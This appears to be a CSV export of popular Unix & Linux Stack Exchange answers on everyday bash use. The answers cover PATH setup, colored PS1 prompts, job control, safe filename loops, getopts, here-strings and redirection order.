<p>As a counterexample to aliases, which I prefer to put in <code>.bashrc</code>, you want to do <code>PATH</code> adjustments in <code>.bash_profile</code> instead, since these changes are typically not <a href=""http://en.wikipedia.org/wiki/Idempotent"" rel=""noreferrer"">idempotent</a>:</p>

<pre><code>export PATH=""$PATH:/some/addition""
</code></pre>

<p>If you put that in <code>.bashrc</code> instead, every time you launched an interactive sub-shell, <code>:/some/addition</code> would get tacked on to the end of the <code>PATH</code> again, creating extra work for the shell when you mistype a command.</p>

<p>You get a new interactive Bash shell whenever you <a href=""http://web.physics.ucsb.edu/~pcs/apps/editors/vi/vi_unix.html"" rel=""noreferrer"">shell out of <code>vi</code></a> with <code>:sh</code>, for example.</p>
"
"Terminal prompt not wrapping correctly","105958","<bash><terminal><prompt>","197","<p>Non-printable sequences should be <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Controlling-the-Prompt"" rel=""noreferrer"">enclosed in <code>\[</code> and <code>\]</code></a>. Looking at your <em>PS1</em> it has a unenclosed sequence after <code>\W</code>. But, the second entry is redundant as well as it repeats the previous statement <em>&quot;1;34&quot;</em>.</p>
<pre><code>\[\033[01;32m\]\u:\[\033[01;34m\] \W\033[01;34m \$\[\033[00m\]
                  |_____________|               |_|
                         |                       |
                         +--- Let this apply to this as well.
</code></pre>
<p>As such this should have intended coloring:</p>
<pre><code>\[\033[1;32m\]\u:\[\033[1;34m\] \W \$\[\033[0m\]
                               |_____|
                                  |
                                  +---- Bold blue.
</code></pre>
<p>Keeping the <em>&quot;original&quot;</em> this should also work:</p>
<pre><code>\[\033[1;32m\]\u:\[\033[1;34m\] \W\[\033[1;34m\] \$\[\033[0m\]
                                  |_|         |_|
                                   |           |
                                   +-----------+-- Enclose in \[ \]
</code></pre>
<hr />
<h3>Edit:</h3>
<p>The reason for the behavior is because <code>bash</code> believes the prompt is longer then it actually is. As a simple example, if one use:</p>
<pre><code>PS1=&quot;\033[0;34m$&quot;
       1 2345678
</code></pre>
<p>The prompt is believed to be 8 characters and not 1. As such if terminal window is 20 columns, after typing 12 characters, it is believed to be 20 and wraps around. This is also evident if one then try to do backspace or <kbd>Ctrl+u</kbd>. It stops at column 9.</p>
<p>However it also does not start new line unless one are on last column, as a result the first line is overwritten.</p>
<p>If one keep typing the line should wrap to next line after 32 characters.</p>
"
"Is there a one-liner that allows me to create a directory and move into it at the same time?","9123","<bash><shell><command-line>","186","<p>This is the one-liner that you need. No other config needed:</p>

<pre><code>mkdir longtitleproject &amp;&amp; cd $_
</code></pre>

<p>The <code>$_</code> variable, in bash, is the last argument given to the previous command. In this case, the name of the directory you just created. As explained in <code>man bash</code>:</p>

<pre><code>_         At  shell  startup,  set to the absolute pathname used to invoke
          the shell or shell script being executed as passed in the  envi‐
          ronment  or  argument  list.   Subsequently, expands to the last
          argument to the previous command, after expansion.  Also set  to
          the  full  pathname  used  to  invoke  each command executed and
          placed in the environment exported to that command.  When check‐
          ing  mail,  this  parameter holds the name of the mail file cur‐
          rently being checked.""$_"" is the last argument of the previous command.
</code></pre>

<p>Use <code>cd $_</code> to retrieve the last argument of the previous command instead of <code>cd !$</code> because <code>cd !$</code> gives the last argument of previous command <strong>in the shell history</strong>:</p>

<pre><code>cd ~/
mkdir folder &amp;&amp; cd !$
</code></pre>

<p>you end up home (or ~/ )</p>

<pre><code>cd ~/
mkdir newfolder &amp;&amp; cd $_
</code></pre>

<p>you end up in newfolder under home !! ( or ~/newfolder )</p>
"
"There are stopped jobs (on bash exit)","116959","<bash><shell><process>","185","<p>A stopped job is one that has been temporarily put into the background and is no longer running, but is still using resources (i.e. system memory). Because that job is not attached to the current terminal, it cannot produce output and is not receiving input from the user.</p>

<p>You can see jobs you have running using the <code>jobs</code> builtin command in bash, probably other shells as well. Example:</p>

<pre><code>user@mysystem:~$ jobs
[1] + Stopped                python
user@mysystem:~$ 
</code></pre>

<p>You can resume a stopped job by using the <code>fg</code> (foreground) bash built-in command. If you have multiple commands that have been stopped you must specify which one to resume by passing jobspec number on the command line with <code>fg</code>. If only one program is stopped, you may use <code>fg</code> alone:</p>

<pre><code>user@mysystem:~$ fg 1
python
</code></pre>

<p>At this point you are back in the python interpreter and may exit by using control-D.</p>

<p>Conversely, you may <code>kill</code> the command with either it's jobspec or PID. For instance:</p>

<pre><code>user@mysystem:~$ ps
  PID TTY          TIME CMD
16174 pts/3    00:00:00 bash
17781 pts/3    00:00:00 python
18276 pts/3    00:00:00 ps
user@mysystem:~$ kill 17781
[1]+  Killed                  python
user@mysystem:~$ 
</code></pre>

<p>To use the jobspec, precede the number with the percent (%) key:</p>

<pre><code>user@mysystem:~$ kill %1
[1]+  Terminated              python
</code></pre>

<p>If you issue an exit command with stopped jobs, the warning you saw will be given. The jobs will be left running for safety. That's to make sure you are aware you are attempting to kill jobs you might have forgotten you stopped. The second time you use the exit command the jobs are terminated and the shell exits. This may cause problems for some programs that aren't intended to be killed in this fashion.</p>

<p>In bash it seems you can use the <code>logout</code> command which will kill stopped processes and exit. This may cause unwanted results.</p>

<p>Also note that some programs may not exit when terminated in this way, and your system could end up with a lot of orphaned processes using up resources if you make a habit of doing that.</p>

<p>Note that you can create background process that will stop if they require user input:</p>

<pre><code>user@mysystem:~$ python &amp;
[1] 19028
user@mysystem:~$ jobs
[1]+  Stopped                 python
</code></pre>

<p>You can resume and kill these jobs in the same way you did jobs that you stopped with the <code>Ctrl-z</code> interrupt.</p>
"
"Run a command that is shadowed by an alias","39291","<bash><shell><alias>","181","<p>You can also prefix a back slash to disable the alias: <code>\ls</code></p>

<p>Edit: Other ways of doing the same include:</p>

<p>Use ""command"": <code>command ls</code> as per <a href=""https://unix.stackexchange.com/a/39302/9427"">Mikel</a>.</p>

<p>Use the full path: <code>/bin/ls</code> as per <a href=""https://unix.stackexchange.com/a/39292/9427"">uther</a>.</p>

<p>Quote the command: <code>""ls""</code> or <code>'ls'</code> as per Mikel comment.</p>

<p>You can remove the alias temporarily for that terminal session with <code>unalias command_name</code>.</p>
"
"Looping through files with spaces in the names?","9496","<bash><scripting><text-processing><find><filenames>","172","<p><strong>Short answer (closest to your answer, but handles spaces)</strong></p>
<pre><code>OIFS=&quot;$IFS&quot;
IFS=$'\n'
for file in `find . -type f -name &quot;*.csv&quot;`  
do
     echo &quot;file = $file&quot;
     diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
     read line
done
IFS=&quot;$OIFS&quot;
</code></pre>
<p><strong>Better answer (also handles wildcards and newlines in file names)</strong></p>
<pre><code>find . -type f -name &quot;*.csv&quot; -print0 | while IFS= read -r -d '' file; do
    echo &quot;file = $file&quot;
    diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
    read line &lt;/dev/tty
done
</code></pre>
<p><strong>Best answer (based on <a href=""https://unix.stackexchange.com/questions/9496/looping-through-files-with-spaces-in-the-names/9500#9500"">Gilles' answer</a>)</strong></p>
<pre><code>find . -type f -name '*.csv' -exec sh -c '
  file=&quot;$0&quot;
  echo &quot;$file&quot;
  diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
  read line &lt;/dev/tty
' exec-sh {} ';'
</code></pre>
<p>Or even better, to avoid running one <code>sh</code> per file:</p>
<pre><code>find . -type f -name '*.csv' -exec sh -c '
  for file do
    echo &quot;$file&quot;
    diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
    read line &lt;/dev/tty
  done
' exec-sh {} +
</code></pre>
<hr />
<p><strong>Long answer</strong></p>
<p>You have three problems:</p>
<ol>
<li>By default, the shell splits the output of a command on spaces, tabs, and newlines</li>
<li>Filenames could contain wildcard characters which would get expanded</li>
<li>What if there is a directory whose name ends in <code>*.csv</code>?</li>
</ol>
<p><strong>1. Splitting only on newlines</strong></p>
<p>To figure out what to set <code>file</code> to, the shell has to take the output of <code>find</code> and interpret it somehow, otherwise <code>file</code> would just be the entire output of <code>find</code>.</p>
<p>The shell reads the <code>IFS</code> variable, which is set to <code>&lt;space&gt;&lt;tab&gt;&lt;newline&gt;</code> by default.</p>
<p>Then it looks at each character in the output of <code>find</code>.  As soon as it sees any character that's in <code>IFS</code>, it thinks that marks the end of the file name, so it sets <code>file</code> to whatever characters it saw until now and runs the loop.  Then it starts where it left off to get the next file name, and runs the next loop, etc., until it reaches the end of output.</p>
<p>So it's effectively doing this:</p>
<pre><code>for file in &quot;zquery&quot; &quot;-&quot; &quot;abc&quot; ...
</code></pre>
<p>To tell it to only split the input on newlines, you need to do</p>
<pre><code>IFS=$'\n'
</code></pre>
<p>before your <code>for ... find</code> command.</p>
<p>That sets <code>IFS</code> to a single newline, so it only splits on newlines, and not spaces and tabs as well.</p>
<p>If you are using <code>sh</code> or <code>dash</code> instead of <code>ksh93</code>, <code>bash</code> or <code>zsh</code>, you need to write <code>IFS=$'\n'</code> like this instead:</p>
<pre><code>IFS='
'
</code></pre>
<p>That is probably enough to get your script working, but if you're interested to handle some other corner cases properly, read on...</p>
<p><strong>2. Expanding <code>$file</code> without wildcards</strong></p>
<p>Inside the loop where you do</p>
<pre><code>diff $file /some/other/path/$file
</code></pre>
<p>the shell tries to expand <code>$file</code> (again!).</p>
<p>It could contain spaces, but since we already set <code>IFS</code> above, that won't be a problem here.</p>
<p>But it could also contain wildcard characters such as <code>*</code> or <code>?</code>, which would lead to unpredictable behavior.  (Thanks to Gilles for pointing this out.)</p>
<p>To tell the shell not to expand wildcard characters, put the variable inside double quotes, e.g.</p>
<pre><code>diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
</code></pre>
<p>The same problem could also bite us in</p>
<pre><code>for file in `find . -name &quot;*.csv&quot;`
</code></pre>
<p>For example, if you had these three files</p>
<pre><code>file1.csv
file2.csv
*.csv
</code></pre>
<p>(very unlikely, but still possible)</p>
<p>It would be as if you had run</p>
<pre><code>for file in file1.csv file2.csv *.csv
</code></pre>
<p>which will get expanded to</p>
<pre><code>for file in file1.csv file2.csv *.csv file1.csv file2.csv
</code></pre>
<p>causing <code>file1.csv</code> and <code>file2.csv</code> to be processed twice.</p>
<p>Instead, we have to do</p>
<pre><code>find . -name &quot;*.csv&quot; -print | while IFS= read -r file; do
    echo &quot;file = $file&quot;
    diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
    read line &lt;/dev/tty
done
</code></pre>
<p><code>read</code> reads lines from standard input, splits the line into words according to <code>IFS</code> and stores them in the variable names that you specify.</p>
<p>Here, we're telling it not to split the line into words, and to store the line in <code>$file</code>.</p>
<p>Also note that <code>read line</code> has changed to <code>read line &lt;/dev/tty</code>.</p>
<p>This is because inside the loop, standard input is coming from <code>find</code> via the pipeline.</p>
<p>If we just did <code>read</code>, it would be consuming part or all of a file name, and some files would be skipped.</p>
<p><code>/dev/tty</code> is the terminal where the user is running the script from.  Note that this will cause an error if the script is run via cron, but I assume this is not important in this case.</p>
<p>Then, what if a file name contains newlines?</p>
<p>We can handle that by changing <code>-print</code> to <code>-print0</code> and using <code>read -d ''</code> on the end of a pipeline:</p>
<pre><code>find . -name &quot;*.csv&quot; -print0 | while IFS= read -r -d '' file; do
    echo &quot;file = $file&quot;
    diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
    read char &lt;/dev/tty
done
</code></pre>
<p>This makes <code>find</code> put a null byte at the end of each file name.  Null bytes are the only characters not allowed in file names, so this should handle all possible file names, no matter how weird.</p>
<p>To get the file name on the other side, we use <code>IFS= read -r -d ''</code>.</p>
<p>Where we used <code>read</code> above, we used the default line delimiter of newline, but now, <code>find</code> is using null as the line delimiter. In <code>bash</code>, you can't pass a NUL character in an argument to a command (even builtin ones), but <code>bash</code> understands <code>-d ''</code> as meaning <em>NUL delimited</em>. So we use <code>-d ''</code> to make <code>read</code> use the same line delimiter as <code>find</code>. Note that <code>-d $'\0'</code>, incidentally, works as well, because <code>bash</code> not supporting NUL bytes treats it as the empty string.</p>
<p>To be correct, we also add <code>-r</code>, which says don't handle backslashes in file names specially.  For example, without <code>-r</code>, <code>\&lt;newline&gt;</code> are removed, and <code>\n</code> is converted into <code>n</code>.</p>
<p>A more portable way of writing this that doesn't require <code>bash</code> or <code>zsh</code> or remembering all the above rules about null bytes (again, thanks to Gilles):</p>
<pre><code>find . -name '*.csv' -exec sh -c '
  file=&quot;$0&quot;
  echo &quot;$file&quot;
  diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
  read char &lt;/dev/tty
' exec-sh {} ';'
</code></pre>
<p>*<em>3. Skipping directories whose names end in <em>.csv</em></em></p>
<pre><code>find . -name &quot;*.csv&quot;
</code></pre>
<p>will also match directories that are called <code>something.csv</code>.</p>
<p>To avoid this, add <code>-type f</code> to the <code>find</code> command.</p>
<pre><code>find . -type f -name '*.csv' -exec sh -c '
  file=&quot;$0&quot;
  echo &quot;$file&quot;
  diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
  read line &lt;/dev/tty
' exec-sh {} ';'
</code></pre>
<p>As <a href=""https://unix.stackexchange.com/users/4667/glenn-jackman"">glenn jackman</a> points out, in both of these examples, the commands to execute for each file are being run in a subshell, so if you change any variables inside the loop, they will be forgotten.</p>
<p>If you need to set variables and have them still set at the end of the loop, you can rewrite it to use process substitution like this:</p>
<pre><code>i=0
while IFS= read -r -d '' file; do
    echo &quot;file = $file&quot;
    diff &quot;$file&quot; &quot;/some/other/path/$file&quot;
    read line &lt;/dev/tty
    i=$((i+1))
done &lt; &lt;(find . -type f -name '*.csv' -print0)
echo &quot;$i files processed&quot;
</code></pre>
<p>Note that if you try copying and pasting this at the command line, <code>read line</code> will consume the <code>echo &quot;$i files processed&quot;</code>, so that command won't get run.</p>
<p>To avoid this, you could remove <code>read line &lt;/dev/tty</code> and send the result to a pager like <code>less</code>.</p>
<hr />
<p><strong>NOTES</strong></p>
<p>I removed the semi-colons (<code>;</code>) inside the loop.  You can put them back if you want, but they are not needed.</p>
<p>These days, <code>$(command)</code> is more common than <code>`command`</code>.  This is mainly because it's easier to write <code>$(command1 $(command2))</code> than <code>`command1 \`command2\``</code>.</p>
<p><code>read char</code> doesn't really read a character.  It reads a whole line so I changed it to <code>read line</code>.</p>
"
"How to suspend and resume processes","2107","<bash><command-line><job-control>","172","<p>You can use <code>kill</code> to stop the process.</p>

<p>For a 'polite' stop to the process (prefer this for normal use), send SIGTSTP:</p>

<pre><code>kill -TSTP [pid]
</code></pre>

<p>For a 'hard' stop, send SIGSTOP:</p>

<pre><code>kill -STOP [pid]
</code></pre>

<p>Note that if the process you are trying to stop by PID is in your shell's job table, it may remain visible there, but terminated, until the process is <code>fg</code>'d again.</p>

<p>To resume execution of the process, sent SIGCONT:</p>

<pre><code>kill -CONT [pid]
</code></pre>
"
"Passing named arguments to shell scripts","129391","<bash><shell-script><zsh><arguments>","171","<p>If you don't mind being limited to single-letter argument names i.e. <code>my_script -p '/some/path' -a5</code>, then in bash you could use the built-in <code>getopts</code>, e.g.</p>

<pre><code>#!/bin/bash

while getopts "":a:p:"" opt; do
  case $opt in
    a) arg_1=""$OPTARG""
    ;;
    p) p_out=""$OPTARG""
    ;;
    \?) echo ""Invalid option -$OPTARG"" &gt;&amp;2
    ;;
  esac
done

printf ""Argument p_out is %s\n"" ""$p_out""
printf ""Argument arg_1 is %s\n"" ""$arg_1""
</code></pre>

<p>Then you can do</p>

<pre><code>$ ./my_script -p '/some/path' -a5
Argument p_out is /some/path
Argument arg_1 is 5
</code></pre>

<p>There is a helpful <a href=""http://wiki.bash-hackers.org/howto/getopts_tutorial"" rel=""noreferrer"">Small getopts tutorial</a> or you can type <code>help getopts</code> at the shell prompt.</p>
"
"Batch renaming files","1136","<shell><bash><rename>","169","<p>If you are using Bash or other POSIX-compatible shell:</p>

<pre><code>for f in *.png; do
    mv -- ""$f"" ""${f#image}""
done
</code></pre>
"
"How do I remove a directory and all its contents?","45676","<bash><rm>","169","<p>The following command will do it for you. Use caution though.</p>

<pre><code>rm -rf directoryname
</code></pre>
"
"Combined `mkdir` and `cd`?","125385","<bash><cd-command><mkdir>","168","<p>Function?</p>

<pre><code>mkcdir ()
{
    mkdir -p -- ""$1"" &amp;&amp;
      cd -P -- ""$1""
}
</code></pre>

<p>Put the above code in the <code>~/.bashrc</code> or another file sourced by the <code>~/.bashrc</code>. Then restart the terminal for changes to apply.</p>

<p>After that simply run <code>mkcdir foo</code> or <code>mkcdir ""nested/path/in quotes""</code>.</p>

<p>Notes:</p>

<ul>
<li><code>""$1""</code> is the first argument of the <code>mkcdir</code> command. Quotes around it protects the argument if it has spaces or other special characters.</li>
<li><code>--</code> makes sure the passed name for the new directory is not interpreted as an option to <code>mkdir</code> or <code>cd</code>, giving the opportunity to create a directory that starts with <code>-</code> or <code>--</code>.</li>
<li><code>-p</code> used on <code>mkdir</code> makes it create extra directories if they do not exist yet, and <code>-P</code> used makes <code>cd</code> resolve symbolic links.</li>
</ul>
"
"How can I delete a word backward at the command line (bash and zsh)?","94331","<bash><keyboard-shortcuts>","167","<p><kbd>Ctrl</kbd>+<kbd>W</kbd> is the standard &quot;kill word&quot; (aka <code>werase</code>).
<kbd>Ctrl</kbd>+<kbd>U</kbd> kills the whole line (<code>kill</code>).</p>
<p>You can change them with <code>stty</code>.</p>
<pre><code>-bash-4.2$ stty -a
speed 38400 baud; 24 rows; 80 columns;
lflags: icanon isig iexten echo echoe -echok echoke -echonl echoctl
        -echoprt -altwerase -noflsh -tostop -flusho pendin -nokerninfo
        -extproc -xcase
iflags: -istrip icrnl -inlcr -igncr -iuclc ixon -ixoff ixany imaxbel
        -ignbrk brkint -inpck -ignpar -parmrk
oflags: opost onlcr -ocrnl -onocr -onlret -olcuc oxtabs -onoeot
cflags: cread cs8 -parenb -parodd hupcl -clocal -cstopb -crtscts -mdmbuf
cchars: discard = ^O; dsusp = ^Y; eof = ^D; eol = &lt;undef&gt;;
        eol2 = &lt;undef&gt;; erase = ^?; intr = ^C; kill = ^U; lnext = ^V;
        min = 1; quit = ^\; reprint = ^R; start = ^Q; status = &lt;undef&gt;;
        stop = ^S; susp = ^Z; time = 0; werase = ^W;
-bash-4.2$ stty werase ^p
-bash-4.2$ stty kill ^a
-bash-4.2$
</code></pre>
<p>Note that one does not have to put the actual control character on the line, <code>stty</code> understands putting <code>^</code> and then the character you would hit with control.</p>
<p>After doing this, if I hit <kbd>Ctrl</kbd>+<kbd>P</kbd> it will erase a word from the line.  And if I hit <kbd>Ctrl</kbd>+<kbd>A</kbd>, it will erase the whole line.</p>
"
"What does <<< mean?","80362","<bash><command-line><sed><command>","164","<p>Others have answered the basic question: what is it?
Let's look at why it's useful.</p>

<p>You can also feed a string to a command's stdin like this:</p>

<pre><code>echo ""$string"" | command
</code></pre>

<p>However in bash, introducing a pipe means the individual commands are run in subshells. Consider this:</p>

<pre><code>echo ""hello world"" | read first second
echo $second $first
</code></pre>

<p>The output of the 2nd echo command prints just a single space. Whaaaa? What happened to my variables? Because the read command is in a pipeline, it is run in a subshell. It correctly reads 2 words from its stdin and assigns to the variables. But then the command completes, <em>the subshell exits</em> and the variables are lost. </p>

<p>Sometimes you can work around this with braces:</p>

<pre><code>echo ""hello world"" | {
    read first second
    echo $second $first
}
</code></pre>

<p>That's OK if your need for the values is contained, but you still don't have those variables in the current shell of your script.
To remedy this confusing situation, use a here-string</p>

<pre><code>read first second &lt;&lt;&lt; ""hello world""
echo $second $first
</code></pre>

<p>Ah, much better!</p>
"
"Quoting within $(command substitution) in Bash","118433","<bash><shell><quoting><command-substitution>","163","<p>
In order from worst to best:</p>

<ul>
<li><code>DIRNAME=""$(dirname $FILE)""</code> <a href=""https://mywiki.wooledge.org/Quotes"" rel=""noreferrer"">will not do what you want</a> if <code>$FILE</code> contains whitespace or globbing characters <code>\[?*</code>.</li>
<li><code>DIRNAME=`dirname ""$FILE""`</code> is technically correct, but <a href=""https://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">backticks are not recommended for command expansion</a> because of the extra complexity when nesting them.</li>
<li><code>DIRNAME=$(dirname ""$FILE"")</code> is correct, but <a href=""https://mywiki.wooledge.org/BashPitfalls#for_i_in_.24.28ls_.2A.mp3.29/BashPitfalls#for_i_in_.24.28ls_.2A.mp3.29"" rel=""noreferrer"">only because this is an assignment</a>. If you use the command substitution in any other context, such as <code>export DIRNAME=$(dirname ""$FILE"")</code> or <code>du $(dirname ""$FILE"")</code>, the lack of quotes will cause trouble if the result of the expansion contain whitespace or globbing characters.</li>
<li><code>DIRNAME=""$(dirname ""$FILE"")""</code> is the recommended way. You can replace <code>DIRNAME=</code> with a command and a space without changing anything else, and <code>dirname</code> receives the correct string.</li>
</ul>

<p>To improve even further:</p>

<ul>
<li><code>DIRNAME=""$(dirname -- ""$FILE"")""</code> works if <code>$FILE</code> starts with a dash.</li>
<li><code>DIRNAME=""$(dirname -- ""$FILE""; printf x)"" &amp;&amp; DIRNAME=""${DIRNAME%?x}""</code> works even if <code>$FILE</code> ends with a newline, since <code>$()</code> chops off newlines at the end of output and <code>dirname</code> outputs a newline after the result. Sheesh <code>dirname</code>, why you gotta be different?</li>
</ul>

<p>You can nest command expansions as much as you like. With <code>$()</code> you always create a new quoting context, so you can do things like this:</p>

<pre class=""lang-sh prettyprint-override""><code>foo ""$(bar ""$(baz ""$(ban ""bla"")"")"")""
</code></pre>

<p>You do <em>not</em> want to try that with backticks.</p>
"
"Can I redirect output to a log file and background a process at the same time?","74520","<bash><shell><shell-script>","161","<p>One problem with your first command is that you redirect stderr to where stdout is (if you changed the $ to a &amp; as suggested in the comment) and then, you redirected stdout to some log file, but that does not pull along the redirected stderr. You must do it in the other order, first send stdout to where you want it to go, and then send stderr to the address stdout is at</p>

<pre><code>some_cmd &gt; some_file 2&gt;&amp;1 &amp;
</code></pre>

<p>and then you could throw the &amp; on to send it to the background. Jobs can be accessed with the <code>jobs</code> command. <code>jobs</code> will show you the running jobs, and number them. You could then talk about the jobs using a % followed by the number like <code>kill %1</code> or so.  </p>

<p>Also, without the &amp; on the end you can suspend the command with <kbd>Ctrl</kbd><kbd>z</kbd>, use the <code>bg</code> command to put it in the background and <code>fg</code> to bring it back to the foreground.  In combination with the <code>jobs</code> command, this is powerful.</p>

<p>to clarify the above part about the order you write the commands. Suppose stderr is address 1002, stdout is address 1001, and the file is 1008. The command reads left to right, so the first thing it sees in yours is <code>2&gt;&amp;1</code> which moves stderr to the address 1001, it then sees <code>&gt; file</code> which moves stdout to 1008, but keeps stderr at 1001. It does not pull everything pointing at 1001 and move it to 1008, but simply references stdout and moves it to the file.<br>
The other way around, it moves stdout to 1008, and then moves stderr to the point that stdout is pointing to, 1008 as well. This way both can point to the single file.</p>
"
"remove particular characters from a variable using bash","104881","<bash><text-processing>","160","<p>There is no need to execute an external program. <code>bash</code>'s <a href=""http://tldp.org/LDP/abs/html/string-manipulation.html"" rel=""noreferrer"">string manipulation</a> can handle it (also available in <code>ksh93</code> (where it comes from), <code>zsh</code> and recent versions of <code>mksh</code>, <code>yash</code> and busybox <code>sh</code> (at least)):</p>

<pre><code>$ VERSION='2.3.3'
$ echo ""${VERSION//.}""
233
</code></pre>

<p>(In those shells' manuals you can generally find this in the <em>parameter expansion</em> section.)</p>
"
"Bash: What does "">|"" do?","45201","<bash><io-redirection><pipe>","160","<p>It's not useless - it's a specialised form of the plain <code>&gt;</code> redirect operator (and, perhaps confusingly, nothing to do with pipes). <code>bash</code> and most other modern shells have an option <code>noclobber</code>, which prevents redirection from overwriting or destroying a file that already exists. For example, if <code>noclobber</code> is true, and the file <code>/tmp/output.txt</code> already exists, then this should fail:</p>

<pre><code>$ some-command &gt; /tmp/output.txt
</code></pre>

<p>However, you can explicitly override the setting of <code>noclobber</code> with the <code>&gt;|</code> redirection operator - the redirection will work, even if <code>noclobber</code> is set.</p>

<p>You can find out if <code>noclobber</code> is set in your current environment with <code>set -o</code>.</p>

<p>For the historical note, both the ""noclobber"" option and its bypass features come from <code>csh</code> (late 70s). <code>ksh</code> copied it (early 80s) but used <code>&gt;|</code> instead of <code>&gt;!</code>. POSIX specified the <code>ksh</code> syntax (so all POSIX shells including bash, newer ash derivatives used as sh on some systems support it). Zsh supports both syntaxes. I don't think it was added to any Bourne shell variant but I might be wrong.</p>
"
"Precedence of the shell logical operators &&, ||","88850","<bash><shell>","160","<p>In many computer languages, operators with the same precedence are <a href=""http://en.wikipedia.org/wiki/Operator_associativity"">left-associative</a>. That is, in the absence of grouping structures, leftmost operations are executed first. Bash is <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Lists"">no exception</a> to this rule.</p>

<p>This is important because, in Bash, <code>&amp;&amp;</code> and <code>||</code> have the same precedence.</p>

<p>So what happens in your example is that the leftmost operation (<code>||</code>) is carried out first:</p>

<pre><code>true || echo aaa
</code></pre>

<p>Since <code>true</code> is obviously true, the <code>||</code> operator short-circuits and the whole statement is considered true without the need to evaluate <code>echo aaa</code> as you would expect. Now it remains to do the rightmost operation:</p>

<pre><code>(...) &amp;&amp; echo bbb
</code></pre>

<p>Since the first operation evaluated to true (i.e. had a 0 exit status), it's as if you're executing</p>

<pre><code>true &amp;&amp; echo bbb
</code></pre>

<p>so the <code>&amp;&amp;</code> will not short-circuit, which is why you see <code>bbb</code> echoed.</p>

<p>You would get the same behavior with</p>

<pre><code>false &amp;&amp; echo aaa || echo bbb
</code></pre>

<p><strong>Notes based on the comments</strong></p>

<ul>
<li>You should note that the left-associativity rule is <em>only</em> followed when both operators have <em>the same</em> precedence. This is not the case when you use these operators in conjunction with keywords such as <code>[[...]]</code> or <code>((...))</code> or use the <code>-o</code> and <code>-a</code> operators as arguments to the <code>test</code> or <code>[</code> commands. In such cases, AND (<code>&amp;&amp;</code> or <code>-a</code>) takes precedence over OR (<code>||</code> or <code>-o</code>). Thanks to Stephane Chazelas' comment for clarifying this point.</li>
<li><p>It seems that <a href=""http://www.difranco.net/compsci/C_Operator_Precedence_Table.htm"">in C</a> and C-like languages <code>&amp;&amp;</code> has higher precedence than <code>||</code> which is probably why you expected your original construct to behave like </p>

<pre><code>true || (echo aaa &amp;&amp; echo bbb). 
</code></pre>

<p>This is not the case with Bash, however, in which both operators have the same precedence, which is why Bash parses your expression using the left-associativity rule. Thanks to Kevin's comment for bringing this up.</p></li>
<li><p>There might also be cases where <em>all 3</em> expressions are evaluated. If the first command returns a non-zero exit status, the <code>||</code> won't short circuit and goes on to execute the second command. If the second command returns with a zero exit status, then the <code>&amp;&amp;</code> won't short-circuit as well and the third command will be executed. Thanks to Ignacio Vazquez-Abrams' comment for bringing this up.</p></li>
</ul>
"
"What color codes can I use in my PS1 prompt?","124407","<bash><colors><prompt>","160","<p>Those are <a href=""http://en.wikipedia.org/wiki/ANSI_escape_code#Colors"" rel=""noreferrer"">ANSI escape sequences</a>; that link is to a chart of color codes but there are other interesting things on that Wikipedia page as well.  Not all of them work on (e.g.) a normal Linux console.</p>

<p>This is incorrect:</p>

<blockquote>
  <p><code>\033]00m\]   # white</code></p>
</blockquote>

<p><code>0</code> resets the terminal to its default (which is probably white).  The actual code for white foreground is 37.  Also, the escaped closing brace at the end (<code>\]</code>) is not part of the color sequence (see the last few paragraphs below for an explanation of their purpose in setting a prompt).</p>

<p>Note that some GUI terminals allow you to specify a customized color scheme. This will affect the output.</p>

<p>There's <a href=""http://misc.flogisoft.com/bash/tip_colors_and_formatting"" rel=""noreferrer"">a list here</a> which adds 7 foreground and 7 background colors I had not seen before, but they seem to work:</p>

<pre><code># Foreground colors
90   Dark gray  
91   Light red  
92   Light green    
93   Light yellow   
94   Light blue 
95   Light magenta  
96   Light cyan  

# Background colors
100  Dark gray  
101  Light red  
102  Light green    
103  Light yellow   
104  Light blue 
105  Light magenta  
106  Light cyan 
</code></pre>

<p>In addition, if you have a 256 color GUI terminal (I think most of them are now), you can apply colors from this chart: </p>

<p><img src=""https://i.stack.imgur.com/UQVe5.png"" alt=""xterm  256 color chart""></p>

<p>The ANSI sequence to select these, using the number in the bottom left corner, starts <code>38;5;</code> for the foreground and <code>48;5;</code> for the background, then the color number, so e.g.:</p>

<pre><code>echo -e ""\\033[48;5;95;38;5;214mhello world\\033[0m""
</code></pre>

<p>Gives me a light orange on tan (meaning, the color chart is roughly approximated).</p>

<p>You can see the colors in this chart<sup>1</sup> as they would appear on your terminal fairly easily:</p>

<pre><code>#!/bin/bash

color=16;

while [ $color -lt 245 ]; do
    echo -e ""$color: \\033[38;5;${color}mhello\\033[48;5;${color}mworld\\033[0m""
    ((color++));
done  
</code></pre>

<p>The output is self-explanatory.  </p>

<p>Some systems set the $TERM variable to <code>xterm-256color</code> if you are on a 256 color terminal via some shell code in <code>/etc/profile</code>.  On others, you should be able to configure your terminal to use this.  That will let TUI applications know there are 256 colors, and allow you to add something like this to your <code>~/.bashrc</code>:</p>

<pre><code>if [[ ""$TERM"" =~ 256color ]]; then
     PS1=""MyCrazyPrompt...""
fi
</code></pre>

<p>Beware that when you use color escape sequences in your prompt, you should enclose them in escaped (<code>\</code> prefixed) square brackets, like this:</p>

<pre><code>PS1=""\[\033[01;32m\]MyPrompt: \[\033[0m\]""
</code></pre>

<p>Notice the <code>[</code>'s interior to the color sequence are not escaped, but the enclosing ones are.  The purpose of the latter is to indicate to the shell that the enclosed sequence does not count toward the character length of the prompt.  If that count is wrong, weird things will happen when you scroll back through the history, e.g., if it is too long, the excess length of the last scrolled string will appear attached to your prompt and you won't be able to backspace into it (it's ignored the same way the prompt is).</p>

<p>Also note that if you want to include the output of a command run every time the prompt is used (as opposed to just once when the prompt is set), you should set it as a literal string with single quotes, e.g.:</p>

<pre><code>PS1='\[\033[01;32m\]$(date): \[\033[0m\]'
</code></pre>

